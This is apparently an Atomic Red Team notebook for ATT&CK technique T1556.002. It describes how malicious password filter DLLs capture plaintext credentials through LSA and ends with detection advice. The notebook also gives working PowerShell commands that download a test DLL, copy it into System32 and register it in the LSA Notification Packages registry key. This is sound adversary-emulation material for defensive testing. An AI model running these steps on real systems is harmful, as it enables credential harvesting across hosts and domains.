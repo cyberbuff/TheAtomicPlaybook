{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a47ac553",
   "metadata": {},
   "source": "# T1556.002 - Password Filter DLL\nAdversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)"
  },
  {
   "cell_type": "markdown",
   "id": "b9583e6b",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ae0001c2",
   "metadata": {},
   "source": "### Atomic Test #1 - Install and Register Password Filter DLL\nUses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\" -OutFile \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "43325cd8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f6581909",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nreg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0062ed0d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "50e33d78",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nreg.exe import \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\AtomicRedTeamPWFilter.dll\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fc3d5c14",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fc7c5a7d",
   "metadata": {},
   "source": "## Detection\nMonitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference.\n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe.(Citation: Clymb3r Function Hook Passwords Sept 2013)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}